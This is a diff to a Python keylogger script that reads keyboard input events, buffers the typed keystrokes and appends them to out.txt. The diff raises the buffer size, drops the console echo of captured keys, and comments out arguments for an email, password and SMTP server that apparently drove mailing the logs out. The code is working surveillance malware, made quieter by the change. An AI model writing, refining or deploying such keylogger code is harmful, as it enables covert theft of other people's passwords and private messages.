@@ -89,39 +89,38 @@ def main():
         event = in_file.read(EVENT_SIZE)
         
         # Write out data once buffer is full
-        if len(typed) == 10:
+        if len(typed) == 128:
             with open("out.txt", "a") as f:
                 f.write(typed)
-                print(typed)
                 # Reset buffer
                 typed = ""
 
     in_file.close()
 
 
-def usage():
-    print("Usage : ./keylogger [your email] [your password] [smtp server] [tls/notls] [buffer_size]") # noqa
+# def usage():
+#     print("Usage : ./keylogger [your email] [your password] [smtp server] [tls/notls] [buffer_size]") # noqa
 
 
-def init_arg():
-    if len(sys.argv) < 5:
-        usage()
-        exit()
-    global EMAIL
-    global SERVER
-    global USE_TLS
-    global BUF_SIZE
-    global PASS
-    EMAIL = sys.argv[1]
-    PASS = sys.argv[2]
-    SERVER = sys.argv[3]
-    if sys.argv[4] is "tls":
-        USE_TLS = True
-    else:
-        USE_TLS = False
-    BUF_SIZE = int(sys.argv[5])
+# def init_arg():
+#     if len(sys.argv) < 5:
+#         usage()
+#         exit()
+#     global EMAIL
+#     global SERVER
+#     global USE_TLS
+#     global BUF_SIZE
+#     global PASS
+#     EMAIL = sys.argv[1]
+#     PASS = sys.argv[2]
+#     SERVER = sys.argv[3]
+#     if sys.argv[4] is "tls":
+#         USE_TLS = True
+#     else:
+#         USE_TLS = False
+#     BUF_SIZE = int(sys.argv[5])
 
 
 if __name__ == "__main__":
-    init_arg()
+    # init_arg()
     main()
